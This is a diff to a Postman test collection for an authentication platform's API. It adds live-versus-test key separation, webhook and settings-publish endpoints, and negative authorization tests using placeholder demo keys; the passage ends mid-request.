@@ -2,7 +2,7 @@
 	"info": {
 		"_postman_id": "authn-platform-collection-v2",
 		"name": "Authn Platform — Enterprise Engine Test Suite",
-		"description": "Complete Postman test collection for Authn Engine. Publishable key: pk_test_demo12345678901234567890123456789012. Secret key: sk_test_demo12345678901234567890123456789012.",
+		"description": "Complete Postman test collection for Authn Engine. Publishable key: pk_test_demo12345678901234567890123456789012. Secret key: sk_test_demo12345678901234567890123456789012. Set {{liveSecretKey}} to an sk_live_ key and {{consoleAdminToken}} to a console JWT with the tenant_admin role for the environment-scoped requests.",
 		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
 	},
 	"variable": [
@@ -24,6 +24,11 @@
 		{
 			"key": "secretKey",
 			"value": "sk_test_demo12345678901234567890123456789012",
+			"type": "string"
+		},
+		{
+			"key": "liveSecretKey",
+			"value": "",
 			"type": "string"
 		},
 		{
@@ -63,6 +68,26 @@
 		},
 		{
 			"key": "invitationToken",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "samlResponseBase64",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "samlRelayState",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "consoleAdminToken",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "sandboxMessageId",
 			"value": "",
 			"type": "string"
 		}
@@ -889,7 +914,7 @@
 							"host": ["{{baseUrl}}"],
 							"path": ["v1", "client", "organizations"]
 						},
-						"description": "Creates a new B2B Organization workspace.\n\nVerified response (201 Created):\n{\n  \"id\": \"org_9038723e-062\",\n  \"name\": \"Acme Corporation\",\n  \"slug\": \"acme-corp-101\"\n}"
+						"description": "Creates a new B2B Organization workspace in the environment of the presented key. The slug is unique per tenant and environment, so the same slug is claimable once in test and once in live, and a workspace is visible only to keys in its own environment.\n\nVerified response (201 Created):\n{\n  \"id\": \"org_9038723e-062\",\n  \"environment\": \"test\",\n  \"name\": \"Acme Corporation\",\n  \"slug\": \"acme-corp-101\"\n}\n\nA test key past TEST_MAX_ORGANIZATIONS answers 403 test_quota_exceeded."
 					}
 				},
 				{
@@ -1063,7 +1088,7 @@
 						"method": "POST",
 						"header": [
 							{ "key": "Content-Type", "value": "application/json" },
-							{ "key": "X-Authn-Secret-Key", "value": "{{secretKey}}" }
+							{ "key": "X-Authn-Secret-Key", "value": "{{liveSecretKey}}" }
 						],
 						"body": {
 							"mode": "raw",
@@ -1074,7 +1099,7 @@
 							"host": ["{{baseUrl}}"],
 							"path": ["v1", "admin", "webhooks", "endpoints"]
 						},
-						"description": "Registers a new webhook endpoint. SSRF validation blocks non-HTTP schemes.\n\nVerified response (201 Created):\n{\n  \"id\": \"whe_5eb5f1be-ed3\",\n  \"secret\": \"whsec_da306471...\"\n}"
+						"description": "Registers a new webhook endpoint. SSRF validation blocks non-HTTP schemes.\n\nVerified response (201 Created):\n{\n  \"id\": \"whe_5eb5f1be-ed3\",\n  \"secret\": \"whsec_da306471...\"\n} A webhook endpoint has no environment of its own: one list per tenant, delivered to in full. Writing it therefore takes a live key — set liveSecretKey to one. A test key is refused 403 live_key_required."
 					}
 				},
 				{
@@ -1082,14 +1107,14 @@
 					"request": {
 						"method": "POST",
 						"header": [
-							{ "key": "X-Authn-Secret-Key", "value": "{{secretKey}}" }
+							{ "key": "X-Authn-Secret-Key", "value": "{{liveSecretKey}}" }
 						],
 						"url": {
 							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints/whe_5eb5f1be-ed3/ping",
 							"host": ["{{baseUrl}}"],
 							"path": ["v1", "admin", "webhooks", "endpoints", "whe_5eb5f1be-ed3", "ping"]
 						},
-						"description": "Dispatches a test ping event signed with HMAC SHA-256 (X-Authn-Signature)."
+						"description": "Dispatches a test ping event signed with HMAC SHA-256 (X-Authn-Signature). A webhook endpoint has no environment of its own: one list per tenant, delivered to in full. Writing it therefore takes a live key — set liveSecretKey to one. A test key is refused 403 live_key_required."
 					}
 				},
 				{
@@ -1097,14 +1122,14 @@
 					"request": {
 						"method": "POST",
 						"header": [
-							{ "key": "X-Authn-Secret-Key", "value": "{{secretKey}}" }
+							{ "key": "X-Authn-Secret-Key", "value": "{{liveSecretKey}}" }
 						],
 						"url": {
 							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints/whe_5eb5f1be-ed3/rotate-secret",
 							"host": ["{{baseUrl}}"],
 							"path": ["v1", "admin", "webhooks", "endpoints", "whe_5eb5f1be-ed3", "rotate-secret"]
 						},
-						"description": "Rotates HMAC signing secret for an endpoint."
+						"description": "Rotates HMAC signing secret for an endpoint. A webhook endpoint has no environment of its own: one list per tenant, delivered to in full. Writing it therefore takes a live key — set liveSecretKey to one. A test key is refused 403 live_key_required."
 					}
 				},
 				{
@@ -1189,14 +1214,14 @@
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\n  \"idp_entity_id\": \"https://idp.acme.com/saml\",\n  \"idp_sso_url\": \"https://idp.acme.com/sso\",\n  \"idp_certificate\": \"-----BEGIN CERTIFICATE-----\\nMIIE...\\n-----END CERTIFICATE-----\",\n  \"allowed_domains\": [\"acme.com\"],\n  \"enforce_sso\": true\n}"
+							"raw": "{\n  \"idp_entity_id\": \"https://idp.acme.com/saml\",\n  \"idp_sso_url\": \"https://idp.acme.com/sso\",\n  \"idp_certificate\": \"-----BEGIN CERTIFICATE-----\\nMIIE...\\n-----END CERTIFICATE-----\",\n  \"allowed_domains\": [\"acme.com\"],\n  \"enforce_sso\": true,\n  \"environment\": \"test\"\n}"
 						},
 						"url": {
 							"raw": "{{baseUrl}}/v1/tenant/organizations/org_12345/saml",
 							"host": ["{{baseUrl}}"],
 							"path": ["v1", "tenant", "organizations", "org_12345", "saml"]
 						},
-						"description": "Creates SAML 2.0 IdP configuration for an organization (admin secret key required)."
+						"description": "Creates SAML 2.0 IdP configuration for an organization (admin secret key required). environment is test here so the request runs against the demo credentials. A connection in live is what an organization's real employees sign in through, so naming live — or omitting the field, whose default is live — takes a live key and is otherwise refused 403 live_key_required."
 					}
 				},
 				{
@@ -1224,7 +1249,7 @@
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\n  \"tenant_id\": \"{{tenantId}}\",\n  \"environment\": \"test\",\n  \"email\": \"{{userEmail}}\"\n}"
+							"raw": "{\n  \"email\": \"{{userEmail}}\"\n}"
 						},
 						"url": {
 							"raw": "{{baseUrl}}/v1/client/auth/resend-verification",
@@ -1248,7 +1273,7 @@
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\n  \"tenant_id\": \"{{tenantId}}\",\n  \"environment\": \"test\",\n  \"email\": \"{{userEmail}}\"\n}"
+							"raw": "{\n  \"email\": \"{{userEmail}}\"\n}"
 						},
 						"url": {
 							"raw": "{{baseUrl}}/v1/client/auth/magic-link",
@@ -1703,7 +1728,7 @@
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\n  \"tenant_id\": \"{{tenantId}}\",\n  \"environment\": \"test\",\n  \"email\": \"{{userEmail}}\"\n}"
+							"raw": "{\n  \"email\": \"{{userEmail}}\"\n}"
 						},
 						"url": {
 							"raw": "{{baseUrl}}/v1/client/auth/recovery/initiate",
@@ -1723,7 +1748,7 @@
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\n  \"tenant_id\": \"{{tenantId}}\",\n  \"environment\": \"test\",\n  \"email\": \"{{userEmail}}\"\n}"
+							"raw": "{\n  \"email\": \"{{userEmail}}\"\n}"
 						},
 						"url": {
 							"raw": "{{baseUrl}}/v1/client/auth/recovery/initiate",
@@ -1962,10 +1987,9 @@
 							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/tenant/password-policy?tenant_id={{tenantId}}",
+							"raw": "{{baseUrl}}/v1/tenant/password-policy",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "tenant", "password-policy"],
-							"query": [{ "key": "tenant_id", "value": "{{tenantId}}" }]
+							"path": ["v1", "tenant", "password-policy"]
 						}
 					}
 				},
@@ -1979,7 +2003,7 @@
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\n  \"tenant_id\": \"{{tenantId}}\",\n  \"min_length\": 8,\n  \"require_uppercase\": true,\n  \"require_lowercase\": true,\n  \"require_digit\": true,\n  \"require_special\": true,\n  \"max_age_days\": 90,\n  \"history_depth\": 5\n}"
+							"raw": "{\n  \"enforcement_mode\": \"require\",\n  \"require_uppercase\": true,\n  \"require_lowercase\": true,\n  \"require_numeric\": true,\n  \"require_special\": true,\n  \"force_upgrade_on_signin\": false,\n  \"min_length\": 12,\n  \"max_length\": 128\n}"
 						},
 						"url": {
 							"raw": "{{baseUrl}}/v1/tenant/password-policy",
@@ -1996,10 +2020,9 @@
 							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/tenant/security-policy?tenant_id={{tenantId}}",
+							"raw": "{{baseUrl}}/v1/tenant/security-policy",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "tenant", "security-policy"],
-							"query": [{ "key": "tenant_id", "value": "{{tenantId}}" }]
+							"path": ["v1", "tenant", "security-policy"]
 						}
 					}
 				},
@@ -2013,7 +2036,7 @@
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\n  \"tenant_id\": \"{{tenantId}}\",\n  \"require_email_verification\": \"hard_block\"\n}"
+							"raw": "{\n  \"require_email_verification\": true,\n  \"email_verification_mode\": \"hard\",\n  \"token_reuse_policy\": \"global_revoke\"\n}"
 						},
 						"url": {
 							"raw": "{{baseUrl}}/v1/tenant/security-policy",
@@ -2030,10 +2053,9 @@
 							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/tenant/recovery-policy?tenant_id={{tenantId}}",
+							"raw": "{{baseUrl}}/v1/tenant/recovery-policy",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "tenant", "recovery-policy"],
-							"query": [{ "key": "tenant_id", "value": "{{tenantId}}" }]
+							"path": ["v1", "tenant", "recovery-policy"]
 						}
 					}
 				},
@@ -2047,7 +2069,7 @@
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\n  \"tenant_id\": \"{{tenantId}}\",\n  \"guardians_enabled\": true,\n  \"phone_otp_enabled\": true,\n  \"email_otp_enabled\": true,\n  \"old_password_enabled\": true,\n  \"security_questions_enabled\": true,\n  \"freeze_window_hours\": 48,\n  \"claim_token_ttl_minutes\": 15,\n  \"lockout_schedule\": [\"24h\", \"3d\", \"7d\", \"14d\", \"4w\", \"8w\", \"12w\", \"permanent\"],\n  \"lockout_reset_days\": 30,\n  \"trusted_device_window_days\": 90,\n  \"ipv4_subnet_bits\": 24,\n  \"ipv6_subnet_bits\": 48,\n  \"max_proof_attempts_per_window\": 5,\n  \"min_guardians\": 1,\n  \"max_guardians\": 5\n}"
+							"raw": "{\n  \"guardians_enabled\": true,\n  \"phone_otp_enabled\": true,\n  \"email_otp_enabled\": true,\n  \"old_password_enabled\": true,\n  \"security_questions_enabled\": true,\n  \"freeze_window_hours\": 48,\n  \"claim_token_ttl_minutes\": 15,\n  \"lockout_schedule\": [\"24h\", \"3d\", \"7d\", \"14d\", \"4w\", \"8w\", \"12w\", \"permanent\"],\n  \"lockout_reset_days\": 30,\n  \"trusted_device_window_days\": 90,\n  \"ipv4_subnet_bits\": 24,\n  \"ipv6_subnet_bits\": 48,\n  \"max_proof_attempts_per_window\": 5,\n  \"min_guardians\": 1,\n  \"max_guardians\": 5\n}"
 						},
 						"url": {
 							"raw": "{{baseUrl}}/v1/tenant/recovery-policy",
@@ -2066,7 +2088,7 @@
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\n  \"tenant_id\": \"{{tenantId}}\",\n  \"freeze_window_hours\": 5,\n  \"guardians_enabled\": false,\n  \"phone_otp_enabled\": false,\n  \"email_otp_enabled\": false,\n  \"old_password_enabled\": false,\n  \"security_questions_enabled\": false\n}"
+							"raw": "{\n  \"freeze_window_hours\": 5,\n  \"guardians_enabled\": false,\n  \"phone_otp_enabled\": false,\n  \"email_otp_enabled\": false,\n  \"old_password_enabled\": false,\n  \"security_questions_enabled\": false\n}"
 						},
 						"url": {
 							"raw": "{{baseUrl}}/v1/tenant/recovery-policy",
@@ -2074,6 +2096,131 @@
 							"path": ["v1", "tenant", "recovery-policy"]
 						},
 						"description": "freeze_window_hours=5 violates min 24. All methods disabled violates rule 7."
+					}
+				},
+				{
+					"name": "Get Session Policy",
+					"request": {
+						"method": "GET",
+						"header": [
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/session-policy",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "session-policy"]
+						},
+						"description": "Cookie SameSite plus access and refresh token lifetimes for the environment the key belongs to. A zero lifetime means the environment inherits the deployment default, not that sessions expire instantly."
+					}
+				},
+				{
+					"name": "Update Session Policy",
+					"request": {
+						"method": "PUT",
+						"header": [
+							{ "key": "Content-Type", "value": "application/json" },
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"cookie_same_site\": \"lax\",\n  \"access_token_ttl_minutes\": 15,\n  \"refresh_token_ttl_days\": 30\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/session-policy",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "session-policy"]
+						},
+						"description": "Nothing here is rejected for being out of range: lifetimes are clamped into their window and an unrecognised cookie_same_site becomes lax. Read the response rather than assuming the request applied verbatim. Try access_token_ttl_minutes 9999 to see the clamp."
+					}
+				},
+				{
+					"name": "Get All Settings (one environment)",
+					"request": {
+						"method": "GET",
+						"header": [
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/settings",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "settings"]
+						},
+						"description": "Every policy column of the key's environment in one read. Social provider client secrets come back as a client_secret_set boolean. An empty column means nothing is configured there and the engine defaults apply — it is not everything switched off."
+					}
+				},
+				{
+					"name": "Diff Test vs Live Settings",
+					"request": {
+						"method": "GET",
+						"header": [
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/settings/diff",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "settings", "diff"]
+						},
+						"description": "Answers what will change in live if test is published. Both environments come back whichever key is used, since comparing them is the point. Read this before publishing — it catches the branding edit you made in test three weeks ago and forgot about."
+					}
+				},
+				{
+					"name": "Publish Test Settings To Live",
+					"request": {
+						"method": "POST",
+						"header": [
+							{ "key": "Content-Type", "value": "application/json" },
+							{ "key": "Authorization", "value": "Bearer {{liveSecretKey}}" }
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"from\": \"test\",\n  \"to\": \"live\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/settings/publish",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "settings", "publish"]
+						},
+						"description": "Copies all seven policy columns from test onto live and stamps published_at. The body may be omitted entirely — test to live is the default.\n\nThe copy is wholesale, not selective, so publishing an empty test environment clears live. That is the faithful meaning of make-live-match-test, which is why the diff request above exists.\n\nNeeds a live key: set liveSecretKey to one. changed lists the columns that actually moved, measured before the write."
+					}
+				},
+				{
+					"name": "Publish Into Live With A Test Key (expect 403)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{ "key": "Content-Type", "value": "application/json" },
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"from\": \"test\",\n  \"to\": \"live\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/settings/publish",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "settings", "publish"]
+						},
+						"description": "The destination must be the key's own environment. Without this guard a test key could overwrite a live configuration, which is the one thing the environment split exists to prevent. Expect 403 'publishing into live requires a live secret key'."
+					}
+				},
+				{
+					"name": "Publish Onto Itself (expect 400)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{ "key": "Content-Type", "value": "application/json" },
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"from\": \"test\",\n  \"to\": \"test\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/settings/publish",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "settings", "publish"]
+						},
+						"description": "Refused rather than treated as a no-op. It would report success while stamping published_at, making the audit trail claim a promotion that never happened. Expect 400 'from and to must name different environments'."
 					}
 				}
 			]
@@ -2412,10 +2559,9 @@
 							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/tenant/roles?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/tenant/roles",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "tenant", "roles"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "tenant", "roles"]
 						},
 						"description": "Lists all tenant roles with assigned permission strings."
 					}
@@ -2433,10 +2579,9 @@
 							"raw": "{\n  \"name\": \"Editor\",\n  \"slug\": \"editor\",\n  \"description\": \"Can manage content\",\n  \"permissions\": [\"posts:create\", \"posts:update\"]\n}"
 						},
 						"url": {
-							"raw": "{{baseUrl}}/v1/tenant/roles?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/tenant/roles",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "tenant", "roles"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "tenant", "roles"]
 						},
 						"description": "Creates a custom role with validated permission format and policy checks."
 					}
@@ -2454,10 +2599,9 @@
 							"raw": "{\n  \"name\": \"Invalid Format\",\n  \"slug\": \"invalid_format\",\n  \"permissions\": [\"banana-permission:write\"]\n}"
 						},
 						"url": {
-							"raw": "{{baseUrl}}/v1/tenant/roles?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/tenant/roles",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "tenant", "roles"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "tenant", "roles"]
 						},
 						"description": "Rejects malformed permission string format."
 					}
@@ -2475,10 +2619,9 @@
 							"raw": "{\n  \"name\": \"Restricted Role\",\n  \"slug\": \"viewer\",\n  \"permissions\": [\"*:write\"]\n}"
 						},
 						"url": {
-							"raw": "{{baseUrl}}/v1/tenant/roles?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/tenant/roles",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "tenant", "roles"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "tenant", "roles"]
 						},
 						"description": "Rejects restricted permission assignments for role slug."
 					}
@@ -2496,10 +2639,9 @@
 							"raw": "{\n  \"role_slug\": \"editor\"\n}"
 						},
 						"url": {
-							"raw": "{{baseUrl}}/v1/admin/users/usr_demo123/roles?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/admin/users/usr_demo123/roles",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "admin", "users", "usr_demo123", "roles"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "admin", "users", "usr_demo123", "roles"]
 						},
 						"description": "Assigns role to user with immutable audit log recording who assigned it."
 					}
@@ -2528,10 +2670,9 @@
 							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/admin/users/usr_demo123/roles/editor?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/admin/users/usr_demo123/roles/editor",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "admin", "users", "usr_demo123", "roles", "editor"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "admin", "users", "usr_demo123", "roles", "editor"]
 						},
 						"description": "Revokes role from user with audit log recording who revoked it."
 					}
@@ -2561,19 +2702,38 @@
 						"method": "POST",
 						"header": [
 							{ "key": "Content-Type", "value": "application/json" },
-							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+							{ "key": "Authorization", "value": "Bearer {{liveSecretKey}}" }
 						],
 						"body": {
 							"mode": "raw",
 							"raw": "{\n  \"url\": \"https://webhook.site/test-handler\",\n  \"description\": \"Production Events Webhook\",\n  \"events\": [\"user.created\", \"session.revoked\"]\n}"
 						},
 						"url": {
-							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "admin", "webhooks", "endpoints"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "admin", "webhooks", "endpoints"]
 						},
-						"description": "Registers a new outgoing webhook endpoint and generates an encrypted HMAC signing secret."
+						"description": "Registers a new outgoing webhook endpoint and generates an encrypted HMAC signing secret. A webhook endpoint has no environment of its own: one list per tenant, delivered to in full. Writing it therefore takes a live key — set liveSecretKey to one. A test key is refused 403 live_key_required."
+					}
+				},
+				{
+					"name": "Register Webhook Endpoint With A Test Key (expect 403)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{ "key": "Content-Type", "value": "application/json" },
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"url\": \"https://webhook.site/test-handler\",\n  \"events\": [\"user.created\"]\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "admin", "webhooks", "endpoints"]
+						},
+						"description": "The same request as above with the test key, refused rather than filed. There is one endpoint list per tenant and the dispatcher delivers every event to all of it, so an entry a test key added would receive live traffic.\n\nExpect 403 with code live_key_required and a message naming the credential rather than a permission — the operator being refused usually holds the live key already and reached for the wrong one."
 					}
 				},
 				{
@@ -2584,12 +2744,11 @@
 							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "admin", "webhooks", "endpoints"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "admin", "webhooks", "endpoints"]
 						},
-						"description": "Lists all registered webhook endpoints for tenant."
+						"description": "Lists all registered webhook endpoints for tenant. Readable with either key: seeing the other environment's configuration crosses nothing, changing it does."
 					}
 				},
 				{
@@ -2600,12 +2759,11 @@
 							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints/{{webhookEndpointId}}?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints/{{webhookEndpointId}}",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "admin", "webhooks", "endpoints", "{{webhookEndpointId}}"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "admin", "webhooks", "endpoints", "{{webhookEndpointId}}"]
 						},
-						"description": "Fetches a specific webhook endpoint by ID."
+						"description": "Fetches a specific webhook endpoint by ID. Readable with either key: seeing the other environment's configuration crosses nothing, changing it does."
 					}
 				},
 				{
@@ -2613,15 +2771,14 @@
 					"request": {
 						"method": "POST",
 						"header": [
-							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+							{ "key": "Authorization", "value": "Bearer {{liveSecretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints/{{webhookEndpointId}}/ping?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints/{{webhookEndpointId}}/ping",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "admin", "webhooks", "endpoints", "{{webhookEndpointId}}", "ping"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "admin", "webhooks", "endpoints", "{{webhookEndpointId}}", "ping"]
 						},
-						"description": "Dispatches an immediate test ping event to verify HMAC signature processing."
+						"description": "Dispatches an immediate test ping event to verify HMAC signature processing. A webhook endpoint has no environment of its own: one list per tenant, delivered to in full. Writing it therefore takes a live key — set liveSecretKey to one. A test key is refused 403 live_key_required."
 					}
 				},
 				{
@@ -2629,15 +2786,14 @@
 					"request": {
 						"method": "POST",
 						"header": [
-							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+							{ "key": "Authorization", "value": "Bearer {{liveSecretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints/{{webhookEndpointId}}/rotate-secret?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints/{{webhookEndpointId}}/rotate-secret",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "admin", "webhooks", "endpoints", "{{webhookEndpointId}}", "rotate-secret"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "admin", "webhooks", "endpoints", "{{webhookEndpointId}}", "rotate-secret"]
 						},
-						"description": "Rotates endpoint HMAC signing secret key."
+						"description": "Rotates endpoint HMAC signing secret key. A webhook endpoint has no environment of its own: one list per tenant, delivered to in full. Writing it therefore takes a live key — set liveSecretKey to one. A test key is refused 403 live_key_required."
 					}
 				},
 				{
@@ -2648,12 +2804,11 @@
 							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/admin/webhooks/deliveries?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/admin/webhooks/deliveries",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "admin", "webhooks", "deliveries"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "admin", "webhooks", "deliveries"]
 						},
-						"description": "Lists webhook delivery audit logs and status codes."
+						"description": "Lists webhook delivery audit logs and status codes. Readable with either key: seeing the other environment's configuration crosses nothing, changing it does."
 					}
 				},
 				{
@@ -2661,15 +2816,14 @@
 					"request": {
 						"method": "DELETE",
 						"header": [
-							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+							{ "key": "Authorization", "value": "Bearer {{liveSecretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints/{{webhookEndpointId}}?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/admin/webhooks/endpoints/{{webhookEndpointId}}",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "admin", "webhooks", "endpoints", "{{webhookEndpointId}}"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "admin", "webhooks", "endpoints", "{{webhookEndpointId}}"]
 						},
-						"description": "Deletes webhook endpoint and cascade deletes associated child delivery logs."
+						"description": "Deletes webhook endpoint and cascade deletes associated child delivery logs. A webhook endpoint has no environment of its own: one list per tenant, delivered to in full. Writing it therefore takes a live key — set liveSecretKey to one. A test key is refused 403 live_key_required."
 					}
 				}
 			]
@@ -2685,10 +2839,9 @@
 							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
 						],
 						"url": {
-							"raw": "{{baseUrl}}/v1/tenant/impersonation-policy?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/tenant/impersonation-policy",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "tenant", "impersonation-policy"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "tenant", "impersonation-policy"]
 						},
 						"description": "Retrieves tenant impersonation policy rules and maximum duration caps."
 					}
@@ -2706,10 +2859,9 @@
 							"raw": "{\n  \"max_duration_minutes\": 30,\n  \"require_step_up_auth\": true,\n  \"require_user_opt_in\": false,\n  \"restrict_admin_impersonation\": true,\n  \"email_notification_policy\": \"IMMEDIATE\"\n}"
 						},
 						"url": {
-							"raw": "{{baseUrl}}/v1/tenant/impersonation-policy?tenant_id=tnt_default",
+							"raw": "{{baseUrl}}/v1/tenant/impersonation-policy",
 							"host": ["{{baseUrl}}"],
-							"path": ["v1", "tenant", "impersonation-policy"],
-							"query": [{ "key": "tenant_id", "value": "tnt_default" }]
+							"path": ["v1", "tenant", "impersonation-policy"]
 						},
 						"description": "Configures tenant impersonation boundaries and mandatory step-up auth requirements."
 					}
@@ -2792,6 +2944,99 @@
 			]
 		},
 		{
+			"name": "17 App Bootstrap & Branding",
+			"item": [
+				{
+					"name": "Get App Bootstrap Configuration",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "X-Authn-Publishable-Key",
+								"value": "{{publishableKey}}"
+							}
+						],
+						"url": {
+							"raw": "{{baseUrl}}/v1/client/app-config",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "client", "app-config"]
+						},
+						"description": "The one call a sign-in page makes before it renders: branding, the sign-in and second-factor methods to offer, the effective password rules, the email verification mode, and the enabled recovery methods. Tenant, application and environment come from the publishable key, so there is no body and no query parameter. Withheld by design: recovery thresholds, provider credentials, and the CORS and redirect allowlists."
+					}
+				},
+				{
+					"name": "Get Tenant Branding",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "X-Authn-Secret-Key",
